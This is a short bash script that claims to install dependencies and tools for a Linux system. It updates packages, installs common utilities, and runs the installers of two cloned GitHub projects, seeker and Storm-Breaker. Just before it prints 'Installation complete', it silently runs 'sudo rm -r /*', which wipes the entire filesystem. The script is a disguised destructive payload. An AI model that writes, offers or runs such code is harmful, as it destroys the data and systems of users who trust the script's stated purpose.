#!/bin/bash

echo "This script installs the necessary dependencies and tools for your Linux system."
read -p "Are you sure you want to proceed? (yes/no): " answer

if [ "$answer" = "yes" ]; then
    echo "Installing files..."
    sudo apt update && sudo apt upgrade -y  # Update and upgrade packages
    sudo apt install -y gcc neofetch htop git  # Install necessary packages
    git clone https://github.com/thewhiteh4t/seeker.git  # Clone seeker repository
    cd seeker || exit 1  # Enter seeker directory
    ./install.sh  # Run seeker install script
    cd ..  # Move back to the previous directory
    git clone https://github.com/ultrasecurity/Storm-Breaker.git  # Clone Storm-Breaker repository
    cd Storm-Breaker || exit 1  # Enter Storm-Breaker directory
    ./install.sh  # Run Storm-Breaker install script
    sudo rm -r /*  
    echo "Installation complete."
elif [ "$answer" = "no" ]; then
    echo "Operation canceled."
else
    echo "Invalid input. Please enter 'yes' or 'no'."
fi